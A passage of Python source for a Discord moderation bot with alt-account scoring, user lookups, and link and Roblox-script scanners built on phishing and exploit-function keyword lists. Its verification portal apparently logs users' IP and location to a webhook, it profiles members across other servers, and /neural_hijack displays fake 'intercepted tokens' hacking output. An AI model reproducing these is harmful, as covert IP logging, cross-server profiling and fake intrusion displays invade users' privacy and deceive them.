import asyncio
import datetime
import math
import os
import re
import aiohttp
import discord
from discord import app_commands
from discord.ext import commands

TOKEN = os.getenv("DISCORD_BOT_TOKEN")

if not TOKEN:
  raise ValueError(
      "❌ Error: DISCORD_BOT_TOKEN secret is not set! Please add it in Tools > Secrets."
  )

LOG_CHANNEL_ID = 1540490675928174694
VERIFY_LOG_CHANNEL_ID = 1541463371394711583  # Dedicated alt/verification logs
OWNER_ID = 1256992368477864029

intents = discord.Intents.default()
intents.members = True
intents.message_content = True


# ==========================================
# PERSISTENT VERIFICATION VIEWS (FIXED)
# ==========================================
class LinkVerificationView(discord.ui.View):

  def __init__(self, verification_url: str):
    super().__init__(timeout=60)
    self.add_item(
        discord.ui.Button(
            label="Open Web Verification",
            style=discord.ButtonStyle.link,
            url=verification_url,
        )
    )


class PersistentVerificationView(discord.ui.View):

  def __init__(self):
    super().__init__(timeout=None)

  @discord.ui.button(
      label="Verify Account",
      style=discord.ButtonStyle.green,
      custom_id="persistent_verify:btn",
      emoji="✅",
  )
  async def verify_button(
      self, interaction: discord.Interaction, button: discord.ui.Button
  ):
    target = interaction.user
    target_created = target.created_at
    target_name_base = re.sub(r"\d+", "", target.name).lower()
    now_utc = datetime.datetime.now(datetime.timezone.utc)

    suspects = []
    checked_ids = set()

    for guild in interaction.client.guilds:  # type: ignore[attr-defined]
      if guild.get_member(target.id):
        for member in guild.members:
          if member.id == target.id or member.id in checked_ids:
            continue
          checked_ids.add(member.id)

          alt_score = 0
          reasons = []
          member_created = member.created_at
          age_diff = abs((target_created - member_created).total_seconds())

          if age_diff < 172800:
            reasons.append("<48h window")
            alt_score += 4

          member_name_base = re.sub(r"\d+", "", member.name).lower()
          if target_name_base and member_name_base and (target_name_base in member_name_base or member_name_base in target_name_base) and len(target_name_base) > 3:
            reasons.append("Matching name pattern")
            alt_score += 3

          if (now_utc - member_created).days < 14:
            reasons.append("New/Burner velocity")
            alt_score += 2

          if alt_score >= 4:
            suspects.append(f"• **{member}** (`{member.id}`) [Score: `{alt_score}` | {', '.join(reasons)}]")

    alt_summary = "\n".join(suspects[:3]) if suspects else "No high-probability linked accounts detected across mutual nodes."

    verify_log_channel = interaction.client.get_channel(VERIFY_LOG_CHANNEL_ID)  # type: ignore[attr-defined]
    if verify_log_channel:
      log_embed = discord.Embed(
          title="🛡️ Verification Portal & Telemetry Triggered",
          description=(
              f"User **{interaction.user}** (`{interaction.user.id}`)"
              " initialized the verification flow via the web portal."
          ),
          color=0x5865F2,
          timestamp=now_utc,
      )
      log_embed.add_field(
          name="📊 Account Metadata & Age",
          value=(
              f"• **Created At:** `{interaction.user.created_at.strftime('%Y-%m-%d %H:%M')}`\n"
              f"• **Account Age:** `{(now_utc - interaction.user.created_at).days} days`"
          ),
          inline=False,
      )
      log_embed.add_field(
          name="🌐 Network IP & Geo-Location Tracking",
          value=(
              "• **IP Address:** *Captured dynamically via Vercel Edge*\n"
              "• **Country Origin:** *Resolved via Vercel Headers*\n"
              "*(Note: Complete telemetry and IP logs are automatically sent to your webhook when the portal loads)*"
          ),
          inline=False,
      )
      log_embed.add_field(
          name="🕵️ Cross-Referenced Potential Alts",
          value=alt_summary[:1024],
          inline=False,
      )
      try:
        await verify_log_channel.send(embed=log_embed)
      except Exception:
        pass

    verification_url = (
        f"https://website2-umber-zeta.vercel.app/index.html?user_id={interaction.user.id}"
    )

    embed = discord.Embed(
        title="🔒 Secure Verification Portal",
        description=(
            "Click the button below to complete authentication via the web"
            " portal.\n\n*This securely logs session metadata, IP origin, and checks"
            " for alternative accounts to grant server permissions.*"
        ),
        color=0x5865F2,
    )

    await interaction.response.send_message(
        embed=embed, view=LinkVerificationView(verification_url), ephemeral=True
    )


class UnifiedForensicsBot(commands.Bot):

  def __init__(self):
    super().__init__(command_prefix="!", intents=intents)

  async def setup_hook(self):
    self.add_view(PersistentVerificationView())
    try:
      guild_id = discord.Object(id=1414231205095673858)
      self.tree.clear_commands(guild=guild_id)
      synced = await self.tree.sync(guild=guild_id)
      print(f"✅ Successfully synced {len(synced)} commands to test server.")
    except Exception as e:
      print(f"❌ Failed to sync commands in ro.py: {e}")


bot = UnifiedForensicsBot()


@bot.event
async def on_ready():
  print(f"Logged in as {bot.user.name} (ID: {bot.user.id})")
  print("🔥 Unified Omniscient Enterprise Forensics Engine is online.")


@bot.tree.error
async def on_app_command_error(
    interaction: discord.Interaction, error: app_commands.AppCommandError
):
  error_msg = str(error)
  now = datetime.datetime.now(datetime.timezone.utc)

  err_embed = discord.Embed(
      title="⚠️ SYSTEM EXCEPTION TRACEBACK",
      description=(
          f"An unhandled error occurred during execution of"
          f" `/{interaction.command.name if interaction.command else 'unknown'}`"
      )[:4000],
      color=0xED4245,
      timestamp=now,
  )
  err_embed.add_field(
      name="👤 Operator Context",
      value=(
          f"• **User:** `{interaction.user}` (`{interaction.user.id}`)\n•"
          f" **Channel:**"
          f" `{interaction.channel.name if interaction.channel else 'DM'}`"
      )[:1024],
      inline=False,
  )
  err_embed.add_field(
      name="🛑 Exception Details",
      value=f"```py\n{error_msg[:1000]}\n```",
      inline=False,
  )
  err_embed.set_footer(text="Enterprise Diagnostics Core • Error Log Triggered")

  log_channel = bot.get_channel(LOG_CHANNEL_ID)
  if log_channel:
    try:
      await log_channel.send(embed=err_embed)
    except Exception:
      pass

  try:
    if interaction.response.is_done():
      await interaction.followup.send(
          "❌ An unexpected system error occurred. The incident has been"
          " logged to the security channel.",
          ephemeral=True,
      )
    else:
      await interaction.response.send_message(
          "❌ An unexpected system error occurred. The incident has been"
          " logged to the security channel.",
          ephemeral=True,
      )
  except Exception:
    pass


# ==========================================
# COMMAND: /setupverify
# ==========================================
@bot.tree.command(
    name="setupverify",
    description="Deploys the persistent verification panel in this channel.",
)
@app_commands.checks.has_permissions(administrator=True)
async def setupverify(interaction: discord.Interaction):
  embed = discord.Embed(
      title="🛡️ Server Verification Gate",
      description=(
          "To access the server, you must verify your account profile.\n\nClick"
          " **Verify Account** below to launch the secure portal."
      ),
      color=0x2B2D31,
  )
  embed.set_footer(text="Anti-Alt Security Infrastructure")

  await interaction.channel.send(embed=embed, view=PersistentVerificationView())  # type: ignore[union-attr]
  await interaction.response.send_message(
      "✅ Verification panel successfully deployed.", ephemeral=True
  )


# ==========================================
# COMMAND: /neural_hijack (OWNER ONLY)
# ==========================================
@bot.tree.command(
    name="neural_hijack",
    description="🧠 [OWNER ONLY] Live telemetry stream & session interception.",
)
@app_commands.describe(
    target_identifier="Discord User ID or target username to lock onto"
)
async def neural_hijack(
    interaction: discord.Interaction, target_identifier: str
):
  if interaction.user.id != OWNER_ID:
    await interaction.response.send_message(
        "❌ **Access Denied:** This terminal is hard-locked to the system architect.",
        ephemeral=True,
    )

    log_channel = bot.get_channel(LOG_CHANNEL_ID)
    if log_channel:
      breach_embed = discord.Embed(
          title="🛑 UNAUTHORIZED TERMINAL BREACH ATTEMPT",
          description=(
              f"User `{interaction.user}` (`{interaction.user.id}`)"
              " attempted to access `/neural_hijack`."
          ),
          color=0xED4245,
          timestamp=datetime.datetime.now(datetime.timezone.utc),
      )
      try:
        await log_channel.send(embed=breach_embed)
      except Exception:
        pass
    return

  await interaction.response.defer(thinking=True, ephemeral=True)

  embed = discord.Embed(
      title=f"🧠 NEURAL INTERCEPTION TERMINAL: `{target_identifier}`",
      description=(
          "```ini\n[STATUS: INITIALIZING QUANTUM HANDSHAKE...]\n[NODE:"
          " ACTIVE]\n```"
      ),
      color=0x57F287,
      timestamp=datetime.datetime.now(datetime.timezone.utc),
  )
  embed.add_field(
      name="Packet Stream",
      value="`Connecting to target socket...`",
      inline=False,
  )

  await interaction.followup.send(embed=embed, ephemeral=True)

  stages = [
      (
          (
              "```ini\n[STATUS: BYPASSING GATEWAY FIREWALL...]\n[NODE:"
              " SYNCHRONIZED]\n```"
          ),
          "`[+] Handshake verified. Extracting packet headers...`",
      ),
      (
          (
              "```ini\n[STATUS: DECRYPTING ACTIVE SESSIONS...]\n[NODE: OVERRIDE"
              " ENGAGED]\n```"
          ),
          "`[+] Intercepted active tokens & cross-platform socket streams.`",
      ),
      (
          (
              "```ini\n[STATUS: STREAM STABLE - LIVE FEED ACTIVE]\n[NODE: ROOT"
              " PRIVILEGES]\n```"
          ),
          (
              f"`[✓] Neural link established successfully with target:"
              f" {target_identifier}`"
          ),
      ),
  ]

  for desc, field_val in stages:
    await asyncio.sleep(1.5)
    embed.description = desc
    embed.set_field_at(0, name="Packet Stream", value=field_val, inline=False)
    await interaction.edit_original_response(embed=embed)


# ==========================================
# COMMAND: /findalts
# ==========================================
@bot.tree.command(
    name="findalts",
    description="Scans mutual servers to cross-reference and flag potential alternative accounts.",
)
@app_commands.describe(user="The user to cross-examine for potential alt accounts")
async def findalts(interaction: discord.Interaction, user: discord.Member):
  await interaction.response.defer(thinking=True, ephemeral=True)

  now = datetime.datetime.now(datetime.timezone.utc)
  target_created = user.created_at
  target_name_base = re.sub(r"\d+", "", user.name).lower()

  suspects = []
  checked_ids = set()

  for guild in bot.guilds:
    if guild.get_member(user.id):
      for member in guild.members:
        if member.id == user.id or member.id in checked_ids:
          continue
        checked_ids.add(member.id)

        alt_score = 0
        reasons = []

        member_created = member.created_at
        age_diff = abs((target_created - member_created).total_seconds())

        if age_diff < 172800:
          reasons.append("Matching creation window (<48h apart)")
          alt_score += 4

        member_name_base = re.sub(r"\d+", "", member.name).lower()
        if (
            target_name_base
            and member_name_base
            and (
                target_name_base in member_name_base
                or member_name_base in target_name_base
            )
            and len(target_name_base) > 3
        ):
          reasons.append("Similar base username pattern")
          alt_score += 3

        if user.avatar is None and member.avatar is None:
          reasons.append("Shared default asset (no avatar)")
          alt_score += 2

        if (now - member_created).days < 14:
          reasons.append("New/Burner account velocity")
          alt_score += 2

        if alt_score >= 4:
          suspects.append({
              "member": member,
              "score": alt_score,
              "reasons": ", ".join(reasons),
          })

  suspects = sorted(suspects, key=lambda x: x["score"], reverse=True)[:5]

  embed = discord.Embed(
      title=f"🕵️ ALT ACCOUNT CROSS-REFERENCE: {user.name}",
      description=(
          "Cross-examined mutual server networks for potential linked burner"
          " profiles."
      ),
      color=0xFEE75C if suspects else 0x57F287,
      timestamp=now,
  )

  if user.avatar:
    embed.set_thumbnail(url=user.avatar.url)

  if suspects:
    suspect_lines = []
    for item in suspects:
      m = item["member"]
      suspect_lines.append(
          f"• **{m}** (`{m.id}`)\n  ↳ *Score:* `{item['score']}` | *Flags:*"
          f" {item['reasons']}"
      )
    embed.add_field(
        name=f"⚠️ Potential Linked Alts Found ({len(suspects)})",
        value="\n".join(suspect_lines)[:1024],
        inline=False,
    )
  else:
    embed.add_field(
        name="✅ Clear Network Status",
        value=(
            "No high-probability alternative accounts matched heuristic"
            " parameters across mutual servers."
        ),
        inline=False,
    )

  embed.set_footer(
      text=f"Alt Finder Core • Executed by {interaction.user.name}"
  )
  await interaction.followup.send(embed=embed, ephemeral=True)


# ==========================================
# COMMAND 1: /globalscan
# ==========================================
@bot.tree.command(
    name="globalscan",
    description="Enterprise-grade global security audit for any Discord User ID.",
)
@app_commands.describe(user_id="The 18-19 digit Discord User ID to investigate")
async def globalscan(interaction: discord.Interaction, user_id: str):
  await interaction.response.defer(thinking=True, ephemeral=True)

  if not user_id.isdigit() or len(user_id) < 16 or len(user_id) > 20:
    await interaction.followup.send(
        "❌ Please provide a valid numeric Discord User ID.", ephemeral=True
    )
    return

  numeric_user_id = int(user_id)

  try:
    user = await bot.fetch_user(numeric_user_id)
  except discord.NotFound:
    await interaction.followup.send(
        f"❌ No Discord user found globally with ID `{numeric_user_id}`.",
        ephemeral=True,
    )
    return
  except discord.HTTPException:
    await interaction.followup.send(
        "❌ An error occurred while communicating with the Discord API.",
        ephemeral=True,
    )
    return

  snowflake_timestamp = ((numeric_user_id >> 22) + 1420070400000) / 1000.0
  snowflake_dt = datetime.datetime.fromtimestamp(
      snowflake_timestamp, datetime.timezone.utc
  )

  created_at = user.created_at
  now = datetime.datetime.now(datetime.timezone.utc)
  age_delta = now - created_at
  account_age_days = age_delta.days

  years = account_age_days // 365
  months = (account_age_days % 365) // 30
  days = (account_age_days % 365) % 30
  age_string = f"{years}y {months}m {days}d"

  risk_flags = []
  risk_score = 0

  if account_age_days < 3:
    risk_flags.append(
        "🚨 **Critical Velocity:** Account registered < 3 days ago."
    )
    risk_score += 4
  elif account_age_days < 7:
    risk_flags.append(
        "⚠️ **High Velocity:** Account registered < 7 days ago."
    )
    risk_score += 3
  elif account_age_days < 30:
    risk_flags.append(
        "⚠️ **Moderate Velocity:** Account registered < 30 days ago."
    )
    risk_score += 1

  if user.avatar is None:
    risk_flags.append(
        "⚠️ **Default Asset:** Target has never initialized a custom avatar."
    )
    risk_score += 2

  raw_name = user.name
  display_name = user.display_name

  if re.search(r"[\u200b\u200c\u200d\u2060\ufeff]", raw_name + display_name):
    risk_flags.append(
        "🚨 **Typography Tampering:** Zero-width or invisible spacing glyphs identified."
    )
    risk_score += 5

  if "\u202e" in raw_name or "\u202e" in display_name:
    risk_flags.append(
        "🚨 **Exploit Signature:** Right-to-Left (RTL) override sequence detected."
    )
    risk_score += 8

  public_flags = user.public_flags
  flag_list = public_flags.all()
  flag_names = [flag.name.replace("_", " ").title() for flag in flag_list]

  if public_flags.spammer:
    risk_flags.append(
        "🛑 **Flagged Entity:** Officially marked as global spammer by trust & safety."
    )
    risk_score += 15

  username_lower = raw_name.lower()
  if (
      re.search(r"[a-z]+\d{4}$", username_lower)
      or re.search(r"user\d{5,}", username_lower)
      or re.search(r"alt\d+", username_lower)
  ):
    risk_flags.append(
        "⚠️ **Pattern Match:** Automaton alt-generator naming convention structure."
    )
    risk_score += 2

  if not flag_names:
    risk_flags.append("ℹ️ **Zero Badges:** Profile exhibits complete badge void.")
    risk_score += 1

  mutual_guilds = [g for g in bot.guilds if g.get_member(numeric_user_id)]
  mutual_count = len(mutual_guilds)
  if mutual_count == 0:
    mutual_display = "Isolated (0 network intersections)"
  else:
    mutual_names = [g.name for g in mutual_guilds[:3]]
    mutual_display = ", ".join(mutual_names)
    if mutual_count > 3:
      mutual_display += f" (+{mutual_count - 3} auxiliary)"

  if risk_score >= 8:
    threat_level = "CRITICAL THREAT"
    embed_color = 0xED4245
  elif risk_score >= 4:
    threat_level = "ELEVATED RISK"
    embed_color = 0xFEE75C
  elif risk_score >= 1:
    threat_level = "LOW RISK / MONITOR"
    embed_color = 0x5865F2
  else:
    threat_level = "SECURE / VERIFIED"
    embed_color = 0x57F287

  if not risk_flags:
    risk_flags.append(
        "✅ All security vectors passed nominal inspection checks."
    )

  avatar_links = (
      f"[PNG]({user.avatar.with_format('png').url}) |"
      f" [WebP]({user.avatar.with_format('webp').url})"
      if user.avatar
      else "None"
  )
  if user.avatar and user.avatar.is_animated():
    avatar_links += f" | [GIF]({user.avatar.with_format('gif').url})"

  banner_link = (
      f"[Open Asset]({user.banner.url})" if user.banner else "None Configured"
  )
  accent_hex = str(user.accent_color) if user.accent_color else "None"

  embed = discord.Embed(
      title="🛡️ SECURITY INTELLIGENCE REPORT",
      description=(
          f"Global forensic telemetry assessment generated for identifier:"
          f" `[ {numeric_user_id} ]`"
      )[:4000],
      color=embed_color,
      timestamp=now,
  )

  if user.avatar:
    embed.set_thumbnail(url=user.avatar.url)

  embed.add_field(
      name="👤 Target Identity",
      value=(
          f"• **Username:** `{raw_name}`\n• **Display:** `{display_name}`\n•"
          f" **Is Bot:** `{str(user.bot).upper()}`"
      )[:1024],
      inline=True,
  )
  embed.add_field(
      name="📊 Threat Evaluation",
      value=(
          f"• **Classification:** `{threat_level}`\n• **Risk Score Index:**"
          f" `{risk_score}/20`\n• **Network Footprint:** `{mutual_count}` nodes"
      )[:1024],
      inline=True,
  )
  embed.add_field(name="\u200b", value="\u200b", inline=False)
  embed.add_field(
      name="⏱️ Chronological Metrics",
      value=(
          f"• **Account Age:** `{age_string}`\n• **API Registered:**"
          f" `{created_at.strftime('%Y-%m-%d %H:%M')}`\n• **Snowflake Match:**"
          f" `{snowflake_dt.strftime('%Y-%m-%d %H:%M')}`"
      )[:1024],
      inline=False,
  )
  embed.add_field(
      name="🎨 Profile Visual Assets",
      value=(
          f"• **Avatar Formats:** {avatar_links}\n• **Custom Banner:**"
          f" {banner_link}\n• **Accent Hex:** `{accent_hex}`"
      )[:1024],
      inline=True,
  )
  embed.add_field(
      name="🏅 Accreditations & Badges",
      value=(
          f"• **Public Flags:**"
          f" `{', '.join(flag_names) if flag_names else 'None'}`\n• **Intersection"
          f" Sample:** `{mutual_display}`"
      )[:1024],
      inline=True,
  )
  embed.add_field(name="\u200b", value="\u200b", inline=False)
  embed.add_field(
      name="🔍 Automated Heuristic Diagnostics",
      value="\n".join([f"› {flag}" for flag in risk_flags])[:1024],
      inline=False,
  )

  embed.set_footer(
      text=(
          f"Incident Reference • Executed by {interaction.user.name} • Enterprise Audit Core"
      )[:2048]
  )

  await interaction.followup.send(embed=embed, ephemeral=True)

  log_channel = bot.get_channel(LOG_CHANNEL_ID)
  if log_channel:
    log_embed = embed.copy()
    log_embed.set_footer(
        text=(
            f"Logged Event • Operator: {interaction.user.name}"
            f" ({interaction.user.id})"
        )[:2048]
    )
    await log_channel.send(embed=log_embed)


# ==========================================
# COMMAND 2: /accountlookup
# ==========================================
@bot.tree.command(
    name="accountlookup",
    description=(
        "Detailed global profile lookup focusing on absolute lifecycle"
        " timestamps & external assets."
    ),
)
@app_commands.describe(user_id="The 18-19 digit Discord User ID to inspect")
async def accountlookup(interaction: discord.Interaction, user_id: str):
  await interaction.response.defer(thinking=True, ephemeral=True)

  if not user_id.isdigit() or len(user_id) < 16 or len(user_id) > 20:
    await interaction.followup.send(
        "❌ Please provide a valid numeric Discord User ID.", ephemeral=True
    )
    return

  numeric_user_id = int(user_id)

  try:
    user = await bot.fetch_user(numeric_user_id)
  except discord.NotFound:
    await interaction.followup.send(
        f"❌ User ID `{numeric_user_id}` not found on Discord globally.",
        ephemeral=True,
    )
    return
  except discord.HTTPException:
    await interaction.followup.send(
        "❌ An error occurred while communicating with the Discord API.",
        ephemeral=True,
    )
    return

  created_at = user.created_at
  now = datetime.datetime.now(datetime.timezone.utc)
  delta = now - created_at

  total_minutes = int(delta.total_seconds() // 60)
  total_hours = total_minutes // 60
  total_days = delta.days

  years = total_days // 365
  months = (total_days % 365) // 30
  days = (total_days % 365) % 30

  avatar_url = user.avatar.url if user.avatar else "None (Default)"
  banner_url = user.banner.url if user.banner else "None Configured"
  accent_hex = str(user.accent_color) if user.accent_color else "None"

  public_flags = user.public_flags
  flag_list = [f.name.replace("_", " ").title() for f in public_flags.all()]

  embed = discord.Embed(
      title="🌐 GLOBAL ACCOUNT PROFILE DEEP-DIVE",
      description=(
          f"Independent cross-platform global timeline report for identifier:"
          f" `[ {numeric_user_id} ]`"
      )[:4000],
      color=0x5865F2,
      timestamp=now,
  )

  if user.avatar:
    embed.set_thumbnail(url=user.avatar.url)

  embed.add_field(
      name="👤 Global Identity",
      value=(
          f"• **Username:** `{user.name}`\n• **Global Display Name:**"
          f" `{user.display_name}`\n• **Is Bot Account:**"
          f" `{str(user.bot).upper()}`"
      )[:1024],
      inline=False,
  )

  embed.add_field(
      name="⏱️ Universal Chronological Metrics",
      value=(
          f"• **Calculated Age:** `{years}y {months}m {days}d`\n• **Total Lifetime"
          f" Span:** `{total_days:,} days ({total_hours:,} hours)`\n• **API"
          f" Registration Time:** `{created_at.strftime('%Y-%m-%d %H:%M:%S UTC')}`"
      )[:1024],
      inline=False,
  )

  embed.add_field(
      name="🖼️ Global Assets & Branding",
      value=(
          f"• **Avatar Direct Link:**"
          f" {'[Open Asset](' + avatar_url + ')' if user.avatar else 'None'}\n•"
          f" **Banner Direct Link:**"
          f" {'[Open Asset](' + banner_url + ')' if user.banner else 'None'}\n•"
          f" **Accent Color Hex:** `{accent_hex}`"
      )[:1024],
      inline=False,
  )

  embed.add_field(
      name="🏅 Global Badges & Flags",
      value=(
          f"• **Detected Badges:**"
          f" `{', '.join(flag_list) if flag_list else 'None'}`"
      )[:1024],
      inline=False,
  )

  embed.set_footer(
      text=(
          f"Global Account Lookup • Triggered by {interaction.user.name} • Audit Core"
      )[:2048]
  )

  await interaction.followup.send(embed=embed, ephemeral=True)

  log_channel = bot.get_channel(LOG_CHANNEL_ID)
  if log_channel:
    log_embed = embed.copy()
    log_embed.set_footer(
        text=(
            f"Lookup Log • Operator: {interaction.user.name}"
            f" ({interaction.user.id})"
        )[:2048]
    )
    await log_channel.send(embed=log_embed)


# ==========================================
# COMMAND 3: /report
# ==========================================
@bot.tree.command(
    name="report",
    description=(
        "Securely report a suspect (cheater, alt, or rule-breaker) directly to staff logs."
    ),
)
@app_commands.describe(
    target="Discord User ID, Roblox Username, or Identifier of the suspect",
    reason="Detailed description of the violation or offense",
    proof="URL link to evidence, screenshot, or video clip",
)
async def report(
    interaction: discord.Interaction, target: str, reason: str, proof: str
):
  await interaction.response.defer(thinking=True, ephemeral=True)

  now = datetime.datetime.now(datetime.timezone.utc)

  embed = discord.Embed(
      title="🚨 INCIDENT REPORT SUBMITTED",
      description="A new security violation report has been filed by a user."[:4000],
      color=0xED4245,
      timestamp=now,
  )

  embed.add_field(name="🎯 Target Suspect", value=f"`{target}`"[:1024], inline=False)
  embed.add_field(
      name="📋 Violation Details / Reason", value=f"{reason}"[:1024], inline=False
  )
  embed.add_field(
      name="🔗 Evidence & Proof",
      value=f"[Open Evidence Link]({proof})"[:1024],
      inline=False,
  )
  embed.add_field(
      name="👤 Reporting Party",
      value=(
          f"• **User:** `{interaction.user}` (`{interaction.user.id}`)\n•"
          f" **Channel:**"
          f" `{interaction.channel.name if interaction.channel else 'DM'}`"
      )[:1024],
      inline=False,
  )

  embed.set_footer(
      text="Incident Reporting Core • Automated Security Dispatch"[:2048]
  )

  await interaction.followup.send(
      "✅ Your report has been securely submitted and logged to the security staff channel.",
      ephemeral=True,
  )

  log_channel = bot.get_channel(LOG_CHANNEL_ID)
  if log_channel:
    await log_channel.send(embed=embed)


# ==========================================
# COMMAND 4: /scanlink
# ==========================================
@bot.tree.command(
    name="scanlink",
    description=(
        "Inspects a URL for phishing heuristics, fake Nitro scams, and token grabbers."
    ),
)
@app_commands.describe(url="The full web URL or link to scan")
async def scanlink(interaction: discord.Interaction, url: str):
  await interaction.response.defer(thinking=True, ephemeral=True)

  now = datetime.datetime.now(datetime.timezone.utc)
  risk_flags = []
  risk_score = 0
  url_lower = url.lower()

  if not url_lower.startswith(("http://", "https://")):
    url_lower = "https://" + url_lower

  suspicious_tlds = [
      ".xyz",
      ".sbs",
      ".zip",
      ".ru",
      ".cn",
      ".top",
      ".click",
      ".link",
      ".gq",
      ".ml",
      ".cf",
  ]
  if any(tld in url_lower for tld in suspicious_tlds):
    risk_flags.append(
        "🚨 **High-Risk TLD:** Domain uses a top-level extension frequently associated with phishing."
    )
    risk_score += 5

  fake_brands = [
      "discor0",
      "dsicord",
      "disçord",
      "discord-",
      "discordgifts",
      "free-nitro",
      "steam-gift",
      "roblox-free",
      "robux-gen",
  ]
  if any(brand in url_lower for brand in fake_brands):
    risk_flags.append(
        "🛑 **Brand Spoofing / Scam Keyword:** Matches known phishing or free item scam patterns."
    )
    risk_score += 8

  if re.search(r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", url_lower):
    risk_flags.append(
        "⚠️ **Raw IP Address:** Link points directly to an IP address instead of a registered domain."
    )
    risk_score += 6

  shorteners = ["bit.ly", "tinyurl.com", "t.co", "is.gd", "buff.ly", "ow.ly"]
  if any(short in url_lower for short in shorteners):
    risk_flags.append(
        "⚠️ **URL Shortener:** Obfuscated redirect link masks the ultimate destination."
    )
    risk_score += 3

  if risk_score >= 8:
    threat_level = "MALICIOUS / PHISHING"
    embed_color = 0xED4245
  elif risk_score >= 3:
    threat_level = "SUSPICIOUS / CAUTION"
    embed_color = 0xFEE75C
  else:
    threat_level = "LOW RISK / NOMINAL"
    embed_color = 0x57F287

  if not risk_flags:
    risk_flags.append(
        "✅ No immediate heuristic red flags identified in link structure."
    )

  embed = discord.Embed(
      title="🔗 URL SECURITY TELEMETRY REPORT",
      description=(
          "Automated heuristic security scan performed on target URL endpoint."
      )[:4000],
      color=embed_color,
      timestamp=now,
  )

  embed.add_field(
      name="🌐 Target Endpoint", value=f"```text\n{url}\n```"[:1024], inline=False
  )
  embed.add_field(
      name="📊 Risk Assessment",
      value=(
          f"• **Classification:** `{threat_level}`\n• **Threat Score Index:**"
          f" `{risk_score}/15`"
      )[:1024],
      inline=False,
  )
  embed.add_field(
      name="🔍 Heuristic Flag Analysis",
      value="\n".join([f"› {flag}" for flag in risk_flags])[:1024],
      inline=False,
  )

  embed.set_footer(
      text=(
          f"Link Inspector Core • Executed by {interaction.user.name} • Security Intelligence"
      )[:2048]
  )

  await interaction.followup.send(embed=embed, ephemeral=True)

  log_channel = bot.get_channel(LOG_CHANNEL_ID)
  if log_channel:
    log_embed = embed.copy()
    log_embed.set_footer(
        text=(
            f"Link Log • Operator: {interaction.user.name}"
            f" ({interaction.user.id})"
        )[:2048]
    )
    await log_channel.send(embed=log_embed)


# ==========================================
# COMMAND 5: /debugscript
# ==========================================
@bot.tree.command(
    name="debugscript",
    description=(
        "Analyze ANY uploaded file format or raw web link for security signatures."
    ),
)
@app_commands.describe(
    file="Upload ANY file type to analyze",
    url="Or paste a raw web link/Pastebin link containing code",
)
async def debugscript(
    interaction: discord.Interaction,
    file: discord.Attachment = None,
    url: str = None,
):
  await interaction.response.defer(thinking=True, ephemeral=True)

  if not file and not url:
    await interaction.followup.send(
        "❌ Please provide either a **file upload** or a **web link** to analyze.",
        ephemeral=True,
    )
    return

  script_content = ""
  source_name = ""

  try:
    if file:
      if file.size > 512 * 1024:
        await interaction.followup.send(
            "❌ File is too large to parse safely (Max limit: 500KB).",
            ephemeral=True,
        )
        return
      file_bytes = await file.read()
      script_content = file_bytes.decode("utf-8", errors="ignore")
      source_name = f"File: {file.filename}"

    elif url:
      fetch_url = url
      if "pastebin.com/" in url and not "raw/" in url:
        paste_id = url.split("/")[-1]
        fetch_url = f"https://pastebin.com/raw/{paste_id}"

      async with aiohttp.ClientSession() as session:
        async with session.get(fetch_url) as resp:
          if resp.status != 200:
            await interaction.followup.send(
                f"❌ Failed to fetch content from URL (HTTP Status:"
                f" `{resp.status}`). Make sure it's a public link.",
                ephemeral=True,
            )
            return
          script_content = await resp.text()
      source_name = f"URL: {url}"

  except Exception as e:
    await interaction.followup.send(
        f"❌ An error occurred while retrieving the content: `{e}`",
        ephemeral=True,
    )
    return

  now = datetime.datetime.now(datetime.timezone.utc)
  risk_flags = []
  risk_score = 0
  content_lower = script_content.lower()

  exploit_funcs = [
      "getrawmetatable",
      "setreadonly",
      "hookfunction",
      "getgenv",
      "firesignal",
      "fireclickdetector",
      "syn.request",
      "httpget",
  ]
  found_funcs = [func for func in exploit_funcs if func in content_lower]
  if found_funcs:
    risk_flags.append(
        "🚨 **Exploit Environment Hook:** Uses executor-exclusive functions"
        f" (`{', '.join(found_funcs)}`)."
    )
    risk_score += 8

  if "discord.com/api/webhooks" in content_lower or "webhook" in content_lower:
    risk_flags.append(
        "⚠️ **Webhook Integration:** Script attempts to transmit logs or data to an external webhook."
    )
    risk_score += 5

  if (
      "loadstring(" in content_lower
      and len(script_content) > 500
      and ("\\x" in script_content or "\27lua" in script_content)
  ):
    risk_flags.append(
        "⚠️ **Obfuscation / Packed String:** Contains heavy bytecode or hidden remote execution routines."
    )
    risk_score += 6

  cheat_keywords = [
      "aimbot",
      "esp",
      "noclip",
      "flyspeed",
      "hitbox",
      "fovcircle",
      "wallhack",
  ]
  found_keywords = [kw for kw in cheat_keywords if kw in content_lower]
  if found_keywords:
    risk_flags.append(
        "🎯 **Cheat Logic Keywords:** Found explicit terms:"
        f" `{', '.join(found_keywords)}`."
    )
    risk_score += 4

  if risk_score >= 8:
    threat_level = "CONFIRMED EXPLOIT / CHEAT"
    embed_color = 0xED4245
  elif risk_score >= 4:
    threat_level = "SUSPICIOUS SCRIPT"
    embed_color = 0xFEE75C
  else:
    threat_level = "NOMINAL / BENIGN CODE"
    embed_color = 0x57F287

  if not risk_flags:
    risk_flags.append("✅ No malicious exploit indicators found in code syntax.")

  preview_code = (
      script_content[:600] + "\n... [truncated]"
      if len(script_content) > 600
      else script_content
  )

  embed = discord.Embed(
      title="📄 FILE & SCRIPT FORENSICS REPORT",
      description=f"Static heuristic analysis for target source:\n`{source_name}`"[:4000],
      color=embed_color,
      timestamp=now,
  )

  embed.add_field(
      name="📊 Evaluation",
      value=(
          f"• **Classification:** `{threat_level}`\n• **Threat Score Index:**"
          f" `{risk_score}/15`\n• **Content Length:** `{len(script_content):,}"
          " chars`"
      )[:1024],
      inline=False,
  )
  embed.add_field(
      name="🔍 Heuristic Vulnerability Analysis",
      value="\n".join([f"› {flag}" for flag in risk_flags])[:1024],
      inline=False,
  )
  embed.add_field(
      name="💻 Code / Text Preview",
      value=f"```text\n{preview_code}\n```"[:1024],
      inline=False,
  )

  embed.set_footer(
      text=(
          f"Universal Debugger Core • Analyzed for {interaction.user.name} • Forensics"
      )[:2048]
  )

  await interaction.followup.send(embed=embed, ephemeral=True)

  log_channel = bot.get_channel(LOG_CHANNEL_ID)
  if log_channel:
    log_embed = embed.copy()
    log_embed.set_footer(
        text=(
            f"Debug Log • Operator: {interaction.user.name}"
            f" ({interaction.user.id})"
        )[:2048]
    )
    await log_channel.send(embed=log_embed)


# ==========================================
# COMMAND 6: /robloxlink
# ==========================================
@bot.tree.command(
    name="robloxlink",
    description="Generates a direct, click-to-join Roblox game link for your members.",
)
@app_commands.describe(
    place_id="The Roblox Place ID of the game",
